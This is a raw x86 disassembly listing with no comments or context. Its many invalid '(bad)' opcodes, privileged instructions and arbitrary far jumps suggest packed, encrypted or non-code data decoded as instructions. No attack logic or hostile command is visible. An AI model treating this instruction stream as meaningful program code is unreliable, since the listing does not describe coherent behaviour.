  403fa9:	in     al,0xe
  403fab:	test   DWORD PTR [ecx+0x3ec51718],edi
  403fb1:	jo     0x403f56
  403fb3:	repz adc BYTE PTR [ebp+0x39b16753],cl
  403fba:	scas   eax,DWORD PTR es:[edi]
  403fbb:	mov    eax,ds:0x13262c4f
  403fc0:	repz mov al,0x13
  403fc3:	inc    ebp
  403fc4:	imul   cx,sp,0xd485
  403fc9:	out    dx,eax
  403fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fcb:	xchg   BYTE PTR [ebx-0x473ae140],ah
  403fd1:	jbe    0x404009
  403fd3:	fwait
  403fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fd5:	dec    ebp
  403fd6:	shl    DWORD PTR [ebp+0x70],1
  403fd9:	(bad)  
  403fdb:	cwde   
  403fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fdd:	jbe    0x40400a
  403fdf:	add    edx,DWORD PTR [esi+0x13d1dc74]
  403fe5:	icebp  
  403fe6:	cwde   
  403fe7:	xor    ah,BYTE PTR ds:0x9297cd30
  403fed:	cdq    
  403fee:	add    eax,0x497623e4
  403ff3:	pop    ds
  403ff4:	or     al,0x98
  403ff6:	xor    dl,BYTE PTR [ecx+0x66]
  403ff9:	add    al,0x95
  403ffb:	mov    esp,0x60104a8b
  404000:	loop   0x403f89
  404002:	addr16 icebp 
  404004:	xchg   BYTE PTR [eax-0x1c],al
  404007:	aas    
  404008:	(bad)  
  404009:	pop    eax
  40400a:	jns    0x404033
  40400c:	inc    ebx
  40400d:	pop    es
  40400e:	add    al,0x98
  404010:	or     al,0xbb
  404012:	xchg   ecx,eax
  404013:	pop    ecx
  404014:	lea    ebp,[ebp-0x67]
  404017:	int    0xc7
  404019:	shr    DWORD PTR [ecx+eax*4-0x6d03bcab],cl
  404020:	push   0xfffffff5
  404022:	fsubrp st(0),st
  404024:	int3   
  404025:	mov    BYTE PTR [edi+0xaaefc89],0x1b
  40402c:	stc    
  40402d:	and    BYTE PTR [eax],ah
  40402f:	jno    0x403fcf
  404031:	push   ss
  404032:	lea    ecx,[ebx]
  404034:	cmc    
  404035:	mov    ah,0x8
  404037:	jmp    0xf8ee9600
  40403c:	repnz cdq 
  40403e:	add    eax,edi
  404040:	popf   
  404041:	fnstenv [ebx]
  404043:	pop    ebx
  404044:	icebp  
  404045:	wrmsr  
  404047:	sbb    eax,0xc6545523
  40404c:	adc    dl,bh
  40404e:	sub    ecx,DWORD PTR [eax]
  404050:	(bad)  
  404051:	sub    DWORD PTR [esi-0x18b30834],eax
  404057:	adc    DWORD PTR [edi+0x3e],ecx
  40405a:	cmp    cl,BYTE PTR [edx-0x79]
  40405d:	fsub   QWORD PTR [ebx]
  40405f:	pusha  
  404060:	mov    WORD PTR [eax],gs
  404062:	cmc    
  404063:	push   eax
  404064:	xchg   ebx,eax
  404065:	mov    edx,0xadab524c
  40406a:	test   eax,0xd04a3896
  40406f:	jb     0x4040ac
  404071:	xchg   ebp,eax
  404072:	aas    
  404073:	lds    ebx,FWORD PTR [ebp+0x14]
  404076:	cmp    al,bl
  404078:	add    ch,BYTE PTR [edi+0x75]
  40407b:	sub    dl,ch
  40407d:	sub    ecx,edx
  40407f:	lahf   
  404080:	inc    ebp
  404081:	jmp    0x40407c
  404083:	push   ds
  404084:	sub    BYTE PTR fs:[ebp+0x7bc72c5],cl
  40408b:	popa   
  40408c:	fmul   DWORD PTR [ecx]
  40408e:	lahf   
  40408f:	push   ss
  404090:	xchg   BYTE PTR [ebp+eax*4+0x9],cl
  404094:	inc    ebp
  404095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404096:	not    BYTE PTR [esi]
  404098:	(bad)  
  404099:	loope  0x4040e7
  40409b:	or     al,0xbd
  40409d:	retf   0x5ad8
  4040a0:	mov    eax,ds:0x10e5474e
  4040a5:	dec    ebx
  4040a6:	inc    edi
  4040a7:	mov    ah,0x1e
  4040a9:	ins    BYTE PTR es:[edi],dx
  4040aa:	xor    DWORD PTR ds:0xaffbc6a2,ebx
  4040b0:	aas    
  4040b1:	xchg   ecx,eax
  4040b2:	xor    esp,DWORD PTR [eax]
  4040b4:	jle    0x40407d
  4040b6:	push   ecx
  4040b7:	scas   eax,DWORD PTR es:[edi]
  4040b8:	mov    ecx,ecx
  4040ba:	stos   DWORD PTR es:[edi],eax
  4040bb:	pop    esi
  4040bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040bd:	and    ebp,DWORD PTR [eax+0x1d]
  4040c0:	inc    ebx
  4040c1:	addr16 pop es
  4040c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040c4:	ss xchg ecx,eax
  4040c6:	pop    esi
  4040c7:	cld    
  4040c8:	enter  0x9f50,0xa0
  4040cc:	lahf   
  4040cd:	aam    0xae
  4040cf:	dec    ebp
  4040d0:	add    eax,0x2d7d9a94
  4040d5:	gs jb  0x404087
  4040d8:	mov    al,ds:0xa55bf560
  4040dd:	jno    0x4040be
  4040df:	or     DWORD PTR ds:0x9168ee47,esp
  4040e5:	xor    eax,edx
  4040e7:	cmp    BYTE PTR [ebx+edi*2-0x6aac9729],ch
  4040ee:	ret    0xc0ce
  4040f1:	adc    DWORD PTR [ebp+esi*1+0x6d065f98],ebx
  4040f8:	dec    ebx
  4040f9:	nop
  4040fa:	into   
  4040fb:	outs   dx,BYTE PTR ds:[esi]
  4040fc:	xchg   esp,eax
  4040fd:	cmp    DWORD PTR ds:0x5205d19,ebp
  404103:	inc    eax
  404104:	mov    esp,0x715e68e7
  404109:	sbb    al,0x5f
  40410b:	mov    al,ds:0x3c0ce40
  404110:	(bad)
  404113:	pop    esp
  404114:	pop    ebx
  404115:	retf   0x5b36
  404118:	retf   0x7ae5
  40411b:	inc    ebp
  40411c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40411d:	test   DWORD PTR [ecx-0x6c],ecx
  404120:	mov    dl,0x14
  404122:	add    al,0x33
  404124:	jp     0x4040b1
  404126:	test   eax,0x9d13e95c
  40412b:	sar    DWORD PTR ds:0x19cc83a6,cl
  404131:	icebp  
  404132:	stos   DWORD PTR es:[edi],eax
  404133:	out    dx,eax
  404134:	hlt    
  404135:	xchg   edx,eax
  404136:	dec    esi
  404137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404138:	push   eax
  404139:	ds push eax
  40413b:	and    DWORD PTR [ebx+0x75b85e99],edi
  404141:	inc    ecx
  404142:	inc    ebx
  404143:	cwde   
  404144:	adc    DWORD PTR [esi],0x2bb8291a
  40414a:	mov    BYTE PTR [edx+0x34],bh
  40414d:	div    DWORD PTR [edx+0x3a7a6856]
  404153:	pop    ds
  404154:	xchg   esi,eax
  404155:	sbb    al,BYTE PTR [edi]
  404157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404158:	or     DWORD PTR [edx+0x4e154969],ecx
  40415e:	test   BYTE PTR [ebx],dl
  404160:	(bad)  
  404161:	fcmovnu st,st(6)
  404163:	hlt    
  404164:	add    al,0x91
  404166:	lods   al,BYTE PTR ds:[esi]
  404167:	out    dx,eax
  404168:	inc    ebx
  404169:	das    
  40416a:	jno    0x404199
  40416c:	push   esi
  40416d:	sbb    al,0x82
  40416f:	(bad)  
  404170:	icebp  
  404171:	push   ss
  404172:	arpl   WORD PTR [ebx],sp
  404174:	fistp  DWORD PTR [eax]
  404176:	xchg   DWORD PTR [edx],eax
  404178:	sub    DWORD PTR [ebx+0x2b],esp
  40417b:	push   cs
  40417c:	int3   
  40417d:	xor    BYTE PTR ds:0xdaac296b,dl
  404183:	jmp    0x3645:0x9aecfa3f
  40418a:	adc    al,0x3a
  40418c:	stos   BYTE PTR es:[edi],al
  40418d:	dec    ecx
  40418e:	popa   
  40418f:	dec    edi
  404190:	mov    DWORD PTR [ecx-0x21],edx
  404193:	scas   al,BYTE PTR es:[edi]
  404194:	cmc    
  404195:	pop    ebp
  404196:	pusha  
  404197:	lea    ebp,[ebx]
  404199:	inc    ecx
  40419a:	cmp    esi,DWORD PTR [edi]
  40419c:	sbb    BYTE PTR [ebp-0x38],ch
  40419f:	enter  0x75d7,0x24
  4041a3:	div    DWORD PTR [ecx-0x6acd911]
  4041a9:	sahf   
  4041aa:	ret    0x579d
  4041ad:	adc    edx,edi
  4041af:	pop    edx
  4041b0:	xor    eax,0x8446902e
  4041b5:	daa    
  4041b6:	xchg   BYTE PTR [ebp+edi*1+0x20b1fd91],dl
  4041bd:	pop    es
  4041be:	sub    BYTE PTR [edx],dh
  4041c0:	inc    DWORD PTR [eax+esi*2+0x3a808bb7]
  4041c7:	sub    BYTE PTR [esi-0x228c5556],0x28
  4041ce:	push   edx
  4041cf:	pop    ds
  4041d0:	sti    
  4041d1:	jmp    0x404246
  4041d3:	sbb    al,0x54
  4041d5:	inc    edx
  4041d6:	and    DWORD PTR [ecx],eax
  4041d8:	xor    ah,BYTE PTR [ecx+ebx*4+0x209c109]
  4041df:	test   ecx,ebp
  4041e1:	pop    ds
  4041e2:	cmp    BYTE PTR [esi-0x76],dh
  4041e5:	into   
  4041e6:	xor    eax,0x8381649f
  4041eb:	push   esp
  4041ec:	jb     0x404188
  4041ee:	hlt    
  4041ef:	(bad)  
  4041f0:	mov    bh,0x90
  4041f2:	mov    ds:0x4096d1c8,al
  4041f7:	repnz scas al,BYTE PTR es:[edi]
  4041f9:	arpl   WORD PTR [ebp+0x216e6fe],sp
  4041ff:	mov    cs,WORD PTR [ecx+0x36]
  404202:	lea    ecx,[ebx+0x3e5734b1]
  404208:	cdq    
  404209:	jb     0x40428a
  40420b:	pop    edx
  40420c:	sahf   
  40420d:	in     eax,dx
  40420e:	push   cs
  40420f:	outs   dx,DWORD PTR ds:[esi]
  404210:	clc    
  404211:	sub    DWORD PTR [ebp-0x2224646d],edx
  404217:	loop   0x4041b1
  404219:	cs test eax,0xe6a5f5cc
  40421f:	hlt    
  404220:	cmp    eax,0x8264b317
  404225:	iret   
  404226:	xor    DWORD PTR [ecx],esp
  404228:	ret    0xfa42
  40422b:	add    bh,al
  40422d:	das    
  40422e:	add    al,0x21
  404230:	add    dl,0x28
  404233:	ins    DWORD PTR es:[edi],dx
  404234:	pusha  
  404235:	(bad)  
  404236:	in     eax,dx
  404237:	dec    esi
  404238:	or     DWORD PTR [ecx],ecx
  40423a:	mov    ebp,ecx
  40423c:	push   edi
  40423d:	stos   BYTE PTR es:[edi],al
  40423e:	push   0xb11ac7e2
  404243:	sbb    dh,cl
  404245:	dec    esp
  404246:	stos   DWORD PTR es:[edi],eax
  404247:	add    ch,ah
  404249:	lods   al,BYTE PTR ds:[esi]
  40424a:	mov    dh,0x6a
  40424c:	and    eax,0xb83e7170
  404251:	repnz bound ecx,QWORD PTR [esi-0x30592921]
  404258:	xchg   ebx,eax
  404259:	adc    eax,esp
  40425b:	(bad)  
  40425c:	fwait
  40425d:	push   esi
  40425e:	aaa    
  40425f:	mov    BYTE PTR [edi+0x2251de47],ch
  404265:	sub    al,0x3e
  404267:	dec    edi
  404268:	xor    ecx,edx
  40426a:	push   esp
  40426b:	xchg   ecx,eax
  40426c:	xchg   edi,eax
  40426d:	popf   
  40426e:	push   DWORD PTR [eax-0x57b06816]
  404274:	adc    BYTE PTR [ebx+0x34],ah
  404277:	pop    es
  404278:	add    DWORD PTR [ebx-0xde32c49],edi
  40427e:	(bad)
  404282:	int    0x43
  404284:	push   edi
  404285:	rcr    BYTE PTR [ecx-0x32],cl
  404288:	repnz add bh,BYTE PTR [ecx+0x560a7224]
  40428f:	les    esi,FWORD PTR [ebp+0x3f]
  404292:	popa   
  404293:	test   eax,0x384c94e6
  404298:	cli    
  404299:	jmp    0x40426e
  40429b:	push   ebp
  40429c:	jge    0x4042d3
  40429e:	aad    0x4c
  4042a0:	jecxz  0x4042ea
  4042a2:	dec    edx
  4042a3:	loope  0x4042be
  4042a5:	inc    DWORD PTR [edi+0x70]
  4042a8:	not    ah
  4042aa:	xchg   ebx,eax
  4042ab:	fdivr  QWORD PTR [ecx+esi*8-0x47]
  4042af:	or     BYTE PTR [ecx+eiz*8-0x20a9521b],bl
  4042b6:	or     eax,DWORD PTR ds:0x695aa72d
  4042bc:	mov    ch,0xd6
  4042be:	(bad)  
  4042c0:	mov    edx,0xa38a80a5
  4042c5:	lea    edx,es:[ebx]
  4042c8:	loopne 0x4042ba
  4042ca:	cmp    bh,BYTE PTR [ebp+0x23]
  4042cd:	xchg   esi,eax
  4042ce:	call   0x1bae:0x45a08ff6
  4042d5:	jo     0x40428d
  4042d7:	gs call 0x209f:0xe1a0acbc
  4042df:	sub    eax,0x18038d3b
  4042e4:	jg     0x40435e
  4042e6:	arpl   bp,si
  4042e8:	add    BYTE PTR [ecx],dl
  4042ea:	(bad)  
  4042eb:	sbb    eax,0xd65cbe7c
  4042f0:	ror    edx,1
  4042f2:	jmp    0x18d1f4de
  4042f7:	cld    
  4042f8:	or     bl,bl
  4042fa:	mov    WORD PTR [esi+0x30f648f8],ds
  404300:	pop    esi
  404301:	xchg   DWORD PTR [esi],eax
  404303:	sub    al,0x30
  404305:	sahf   
  404306:	push   edx
  404307:	xlat   BYTE PTR ds:[ebx]
  404308:	xchg   edx,eax
  404309:	nop
  40430a:	lods   eax,DWORD PTR ds:[esi]
  40430b:	push   0xacc8b569
  404310:	mov    bh,ch
  404312:	mov    bl,0x74
  404314:	dec    ebx
  404315:	mov    ebx,0x9014dec9
  40431a:	mov    ds:0xa7f1f2bc,eax
  40431f:	cwde   
  404320:	fwait
  404321:	in     eax,dx
  404322:	ror    BYTE PTR [esi+0x2d],cl
  404325:	cmp    dh,dl
  404327:	sub    DWORD PTR [ebx],0xaa7de984
  40432d:	or     eax,0x69edae30
  404332:	mov    WORD PTR [edi+0x43],ds
  404335:	fsubp  st(0),st
  404337:	inc    ebx
  404338:	jmp    0x404373
  40433a:	leave  
  40433b:	into   
  40433c:	or     eax,0xf0f47ae0
  404341:	push   esp
  404342:	cmp    al,0x7b
  404344:	into   
  404345:	mov    edx,0xd69f5335
  40434a:	xor    eax,DWORD PTR [ebx]
  40434c:	sub    al,0x8d
  40434e:	xchg   ecx,eax
  40434f:	push   eax
  404350:	punpckhdq mm3,QWORD PTR [ebp+0x5f411752]
  404357:	dec    edx
  404358:	xor    esp,DWORD PTR [ecx+0x18]
  40435b:	mov    al,0x4b
  40435d:	mov    edx,0x7b6dca1e
  404362:	bsf    ebp,DWORD PTR [esi-0x34d39c0c]
  404369:	and    eax,0xcf931f1f
  40436e:	sbb    ah,BYTE PTR [eax+0x6502d29a]
  404374:	icebp  
  404375:	outs   dx,BYTE PTR ds:[esi]
  404376:	lea    eax,[ebp+0x53751ae6]
  40437c:	sub    eax,0x82dd5125
  404381:	les    ebp,FWORD PTR [edi]
  404383:	popa   
  404384:	mov    edi,0x5be88b1e
  404389:	push   ecx
  40438a:	leave  
  40438b:	pop    es
  40438c:	shl    DWORD PTR [eax-0x69043a29],1
  404392:	mov    ds:0x85c99ded,eax
  404397:	jns    0x404347
  404399:	xor    DWORD PTR [edx-0x57262970],ebx
  40439f:	push   cs
  4043a0:	lds    edi,FWORD PTR [ebx+0x21]
  4043a3:	jbe    0x404346
  4043a5:	mov    eax,ds:0x6579a7
  4043aa:	xor    al,0x21
  4043ac:	shl    BYTE PTR [ebx+eiz*1+0x5b6f78e9],0x4e
  4043b4:	(bad)  
  4043b6:	jne    0x4043c8
  4043b8:	aaa    
  4043b9:	test   DWORD PTR [esi],esp
  4043bb:	enter  0x941,0x51
  4043bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043c0:	or     dh,dh
  4043c2:	sub    ah,dh
  4043c4:	iret   
  4043c5:	sahf   
  4043c6:	(bad)  
  4043c7:	pop    ecx
  4043c8:	pop    edi
  4043c9:	mov    edi,0x43fdca26
  4043ce:	cli    
  4043cf:	cmp    dl,BYTE PTR [edi]
  4043d1:	push   ecx
  4043d2:	add    al,0x9
  4043d4:	add    eax,0x5a3e6b01
  4043d9:	push   edx
  4043da:	mov    eax,ds:0x20addb93
  4043df:	mov    dl,0xc5
  4043e1:	mov    ch,0x95
  4043e3:	stos   DWORD PTR es:[edi],eax
  4043e4:	push   eax
  4043e5:	jmp    0xc3f7680d
  4043ea:	retf   0xab04
  4043ed:	dec    edi
  4043ee:	aaa    
  4043ef:	and    bl,BYTE PTR [edx]
  4043f1:	xor    esi,DWORD PTR [esi]
  4043f3:	xor    DWORD PTR [edi],esp
  4043f5:	popa   
  4043f6:	pop    ds
  4043f7:	pushf  
  4043f8:	pushf  
  4043f9:	cwde   
  4043fa:	or     ebx,edi
  4043fc:	jne    0x40441c
  4043fe:	iret   
  4043ff:	xchg   ebp,eax
  404400:	add    esi,DWORD PTR ds:[esi-0x3e]
  404404:	inc    ebp
  404405:	lea    ecx,[edx+0x2c]
  404408:	push   ds
  404409:	or     al,0xab
  40440b:	rcl    ecx,cl
  40440d:	loop   0x404417
  40440f:	or     eax,0x9e426f2b
  404414:	mov    ds:0x86f68e23,al
  404419:	pop    eax
  40441a:	mov    eax,fs
  40441c:	push   0xffffffa6
  40441e:	out    0x82,al
  404420:	xchg   BYTE PTR [ebx-0xf7d425d],al
  404426:	push   esp
  404427:	loopne 0x404414
  404429:	inc    esi
  40442a:	or     BYTE PTR [ecx],ah
  40442c:	or     eax,0x4a533d18
  404431:	out    0xd9,eax
  404433:	rcr    bl,cl
  404435:	dec    esp
  404436:	cmp    esp,0x27
  404439:	or     edi,DWORD PTR [edi-0x1cc77622]
  40443f:	or     eax,DWORD PTR ds:0x77f782f3
  404445:	jle    0x4043ca
  404447:	out    dx,eax
  404448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404449:	stos   BYTE PTR es:[edi],al
  40444a:	xor    eax,0xedc9b0a2
  40444f:	push   es
  404450:	(bad)  
  404451:	lods   eax,DWORD PTR ds:[esi]
  404452:	sysexit 
  404454:	cmp    bh,dh
  404456:	sbb    eax,0x10cce381
  40445b:	xchg   ecx,eax
  40445c:	mov    ah,0xe
  40445e:	sahf   
  40445f:	and    esi,DWORD PTR [edx]
  404461:	test   BYTE PTR [edi+0xb],bh
  404464:	dec    edx
  404465:	addr16 xchg eax,ebp
  404468:	and    al,0xb2
  40446a:	lahf   
  40446b:	inc    esi
  40446c:	inc    ebp
  40446d:	push   edx
  40446e:	dec    ebp
  40446f:	out    0xcd,al
  404471:	mov    ds:0xe9052d90,al
  404476:	lods   al,BYTE PTR ds:[esi]
  404477:	test   DWORD PTR [esi+eax*8-0x4b],edx
  40447b:	mov    al,ds:0x5b78508a
  404480:	inc    ebp
  404481:	mov    DWORD PTR [ebp-0x76],ebp
  404484:	add    eax,0x803509a2
  404489:	test   eax,0x8651f81a
  40448e:	dec    esi
  40448f:	mov    DWORD PTR [edx+edx*2+0x37],0xd2100ec4
  404497:	mov    eax,ds:0xebb051f6
  40449c:	dec    edi
  40449d:	adc    eax,0xa6a420af
  4044a2:	mov    esp,DWORD PTR [esi-0x15]
  4044a5:	mov    eax,ds:0x200325f9
  4044aa:	mov    al,0x46
  4044ac:	test   DWORD PTR [eax],0xb2305fd
  4044b2:	mov    dh,0xe9
  4044b4:	int    0x3f
  4044b6:	mov    ds:0x748486bd,al
  4044bb:	mov    ebx,0xb3b82758
  4044c0:	pop    ss
  4044c1:	xor    al,0xc3
  4044c3:	mov    edx,DWORD PTR [edx+0xd]
  4044c6:	cmp    DWORD PTR [ebp-0x663a10bc],ebx
  4044cc:	or     eax,0xd6daec8f
  4044d1:	test   eax,0xfb7a26b9
  4044d6:	xchg   ecx,eax
  4044d7:	fcom   st(5)
  4044d9:	es (bad) 
  4044db:	push   esp
  4044dc:	or     edi,DWORD PTR [ebx]
  4044de:	push   es
  4044df:	repz or eax,DWORD PTR [ecx]
  4044e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e3:	loopne 0x404508
  4044e5:	push   0x1e70162d
  4044ea:	(bad)  
  4044eb:	and    ch,BYTE PTR [edi]
  4044ed:	jbe    0x4044da
  4044ef:	ret    
  4044f0:	hlt    
  4044f1:	push   esi
  4044f2:	data16 jg 0x404486
  4044f5:	or     eax,0xc4f38bf9
  4044fa:	lods   al,BYTE PTR ds:[esi]
  4044fb:	out    0xbb,eax
  4044fd:	in     al,0x6d
  4044ff:	sub    al,0xd6
  404501:	inc    esi
  404502:	mov    ecx,0x95d028a9
  404507:	xchg   edi,eax
  404508:	mov    edx,0xafae60ef
  40450d:	and    eax,0x7a8aab71
  404512:	lea    eax,[edi]
  404514:	jge    0x4044d1
  404516:	inc    esp
  404517:	ror    BYTE PTR [esi],0x9d
  40451a:	hlt    
  40451b:	xchg   ebp,eax
  40451c:	(bad)  
  40451d:	test   eax,0x2f36a061
  404522:	aaa    
  404523:	mov    edx,DWORD PTR [ebp-0x66]
  404526:	cdq    
  404527:	shl    dl,0xa
  40452a:	jl     0x40451b
  40452c:	xchg   esi,eax
  40452d:	jae    0x4044f8
  40452f:	out    0xdb,al
  404531:	xchg   edx,eax
  404532:	in     eax,dx
  404533:	test   BYTE PTR [ebx-0x56],cl
  404536:	cmp    BYTE PTR [ecx-0x69a60698],dl
  40453c:	nop
  40453d:	jo     0x40453a
  40453f:	(bad)  
  404540:	xchg   edi,eax
  404541:	fist   WORD PTR [ecx+0xd7c9435]
  404547:	sti    
  404548:	pop    es
  404549:	xor    ah,dh
  40454b:	sbb    ah,BYTE PTR [edi]
  40454d:	call   0x1f01:0xf663a7d0
  404554:	cmp    al,0xea
  404556:	daa    
  404557:	add    eax,0x2bcce593
  40455c:	stos   BYTE PTR es:[edi],al
  40455d:	test   DWORD PTR [eax+0xb463b9b],edi
  404563:	(bad)  
  404564:	ret    
  404565:	mov    ch,0xb3
  404567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404568:	jp     0x4045aa
  40456a:	inc    esi
  40456b:	mov    ds:0x36fa7a8,al
  404570:	xchg   esp,eax
  404571:	jecxz  0x404583
  404573:	lods   eax,DWORD PTR ds:[esi]
  404574:	jb     0x4045d0
  404576:	std    
  404577:	loope  0x4045a5
  404579:	test   al,0xb8
  40457b:	into   
  40457c:	mov    ebp,0xcbc83770
  404581:	jge    0x404554
  404583:	inc    ecx
  404584:	bound  edi,QWORD PTR [ebx]
  404586:	(bad)  
  404588:	loop   0x404581
  40458a:	inc    DWORD PTR [esi+esi*8-0x829eb01]
  404591:	aam    0x7b
  404593:	jnp    0x40454e
  404595:	les    ebp,FWORD PTR [esi]
  404597:	in     al,0xe4
  404599:	mov    bh,0x68
  40459b:	cwde   
  40459c:	xchg   esi,eax
  40459d:	arpl   WORD PTR [ecx+0x1a2ec604],di
  4045a3:	jg     0x4045ed
  4045a5:	(bad)  
  4045a6:	aad    0x1c
  4045a8:	cmp    BYTE PTR [esi+0x11],ch
  4045ab:	push   0x25
  4045ad:	adc    BYTE PTR [ebp-0x7d],bl
  4045b0:	sub    al,BYTE PTR [ebp+eiz*2+0x60cff854]
  4045b7:	ins    DWORD PTR es:[edi],dx
  4045b8:	adc    dl,BYTE PTR [eax+0x2eeae346]
  4045be:	and    bh,0x5b
  4045c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045c2:	lods   al,BYTE PTR ds:[esi]
  4045c3:	in     eax,0x2f
  4045c5:	lahf   
  4045c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045c7:	xchg   esp,eax
  4045c8:	test   al,0x62
  4045ca:	aad    0x9e
  4045cc:	addr16 push ss
  4045ce:	or     al,0xef
  4045d0:	cmp    BYTE PTR ds:0x73c2ce43,bl
  4045d6:	iret   
  4045d7:	rcl    DWORD PTR [edi],cl
  4045d9:	adc    BYTE PTR [edi-0x7b],ah
  4045dc:	jo     0x4045a1
  4045de:	mov    al,ds:0x6c22109f
  4045e3:	cld    
  4045e4:	scas   eax,DWORD PTR es:[edi]
  4045e5:	mov    dh,0xc6
  4045e7:	loope  0x404651
  4045e9:	ret    0xe2df
  4045ec:	lods   al,BYTE PTR ds:[esi]
  4045ed:	sub    eax,0x197e1281
  4045f2:	add    ebp,DWORD PTR [edi]
  4045f4:	inc    edi
  4045f5:	mov    dh,0xb
  4045f7:	inc    esp
  4045f8:	retf   
  4045f9:	mov    fs,WORD PTR [ebp+0x2e]
  4045fc:	add    BYTE PTR [ebx],dh
  4045fe:	inc    esi
  4045ff:	cli    
  404600:	icebp  
  404601:	cmp    al,0x34
  404603:	int3   
  404604:	mov    al,0x18
  404606:	int3   
  404607:	xchg   ebx,eax
  404608:	(bad)  [ecx-0x40ef62a4]
  40460e:	mov    DWORD PTR [ecx+0x709b7691],esp
  404614:	mov    DWORD PTR [ebp+0x70],esp
  404617:	jmp    0x4045d7
  404619:	fcom   DWORD PTR [edi]
  40461b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40461c:	jmp    0x404617
  40461e:	cmp    eax,0x2c7f8868
  404623:	inc    eax
  404624:	das    
  404625:	idiv   ebp
  404627:	fsubr  QWORD PTR [eax+0x5b]
  40462a:	jne    0x4046a2
  40462c:	inc    esi
  40462d:	or     edx,eax
  40462f:	outs   dx,DWORD PTR ds:[esi]
  404630:	test   dl,cl
  404632:	imul   esp,edi,0x7bcb6fb8
  404638:	xchg   ebx,eax
  404639:	jb     0x404675
  40463b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40463c:	jmp    0x5b9d:0xeca9620
  404643:	mov    eax,ds:0xb80099aa
  404648:	xor    DWORD PTR [ebp-0x45],esp
  40464b:	push   ecx
  40464c:	mov    edx,ecx
  40464e:	sbb    ah,BYTE PTR cs:[esi+ebp*2]
  404652:	xchg   edi,eax
  404653:	inc    edx
  404654:	loop   0x4045f8
  404656:	add    edx,esi
  404658:	lods   al,BYTE PTR ds:[esi]
  404659:	mov    BYTE PTR gs:[ecx],ch
  40465c:	mov    dl,BYTE PTR [eax-0x713142f2]
  404662:	mov    ds:0x95933b4e,eax
  404667:	mov    ds:0xa2f6a370,al
  40466c:	jecxz  0x40462c
  40466e:	and    ah,BYTE PTR [ebx-0x3]
  404671:	push   eax
  404672:	adc    BYTE PTR [esi+0x6],dl
  404675:	ficom  DWORD PTR [edi+edx*1-0x4092f24a]
  40467c:	pop    eax
  40467d:	mov    ebp,0xd1b11e4e
  404682:	inc    ebx
  404683:	imul   edx,DWORD PTR [esi+0x22],0x53
  404687:	mov    ebp,DWORD PTR es:0xfd95983d
  40468e:	inc    edi
  40468f:	icebp  
  404690:	sbb    DWORD PTR [ecx],edi
  404692:	out    dx,eax
  404693:	repnz call FWORD PTR [eax-0x64]
  404697:	into   
  404698:	iret   
  404699:	or     eax,0xd68823bb
  40469e:	fisub  WORD PTR [eax+0x3b]
  4046a1:	xlat   BYTE PTR ds:[ebx]
  4046a2:	pushf  
  4046a3:	aaa    
  4046a4:	faddp  st(7),st
  4046a6:	aas    
  4046a7:	xor    al,0x38
  4046a9:	imul   ebp,DWORD PTR [eax+0x420f981],0xffffffdb
  4046b0:	add    DWORD PTR [edi-0xa],0xffffffb1
  4046b4:	add    eax,0x2d081d94
  4046b9:	nop
  4046ba:	loope  0x4046c1
  4046bc:	pop    ds
  4046bd:	leave  
  4046be:	(bad)  
  4046bf:	(bad)  
  4046c0:	xchg   BYTE PTR [edx-0x32],ah
  4046c3:	add    DWORD PTR [ecx+0x603175a],ebp
  4046c9:	(bad)  
  4046cb:	in     al,0x0
  4046cd:	xchg   esi,eax
  4046ce:	push   ss
  4046cf:	jmp    0x404660
  4046d1:	jp     0x40471c
  4046d3:	(bad)  
  4046d4:	in     eax,dx
  4046d5:	retf   
  4046d6:	pushf  
  4046d7:	ret    
  4046d8:	in     al,dx
  4046d9:	iret   
  4046da:	scas   al,BYTE PTR es:[edi]
  4046db:	xor    BYTE PTR fs:[bx+di],ch
  4046df:	loopne 0x4046a2
  4046e1:	pushf  
  4046e2:	xor    BYTE PTR [ebx-0x79],0x90
  4046e6:	and    BYTE PTR [eax+0x2a],bh
  4046e9:	outs   dx,DWORD PTR ds:[esi]
  4046ea:	push   0xa96fe776
  4046ef:	dec    eax
  4046f0:	cli    
  4046f1:	adc    BYTE PTR [ebp+ebx*4-0x160d67c5],dl
  4046f8:	inc    ebx
  4046f9:	clc    
  4046fa:	mov    ds:0x25a8ddcf,al
  4046ff:	mov    dh,0xc0
  404701:	mov    bh,0x6
  404703:	popf   
  404704:	pop    eax
  404705:	inc    esp
  404706:	xchg   edx,eax
  404707:	outs   dx,DWORD PTR ds:[esi]
  404708:	stos   BYTE PTR es:[edi],al
  404709:	jo     0x40469e
  40470b:	mov    cs,WORD PTR ds:[esi+ecx*2+0x8]
  404710:	scas   eax,DWORD PTR es:[edi]
  404711:	jmp    0xf798:0xf0c8fa07
  404718:	push   ds
  404719:	lea    esi,[edx+0x1d46fb1c]
  40471f:	push   edi
  404720:	daa    
  404721:	or     al,0x3
  404723:	cs lahf 
  404725:	sbb    DWORD PTR [ecx-0x9b937be],esi
  40472b:	mov    ebx,0x1d17708f
  404730:	mov    al,0x94
  404732:	rcr    edi,cl
  404734:	rol    BYTE PTR [eax+0x38256933],1
  40473a:	cdq    
  40473b:	pop    eax
  40473c:	scas   eax,DWORD PTR es:[edi]
  40473d:	add    cl,BYTE PTR [esi-0x6f73196a]
  404743:	test   eax,0x9d13a525
  404748:	cmp    cl,BYTE PTR [edx+0x2f]
  40474b:	sahf   
  40474c:	sub    al,0xbe
  40474e:	stc    
  40474f:	stos   DWORD PTR es:[edi],eax
  404750:	lods   eax,DWORD PTR ds:[esi]
  404751:	sub    ebx,DWORD PTR [esi+0x4a2ce6cf]
  404757:	inc    ecx
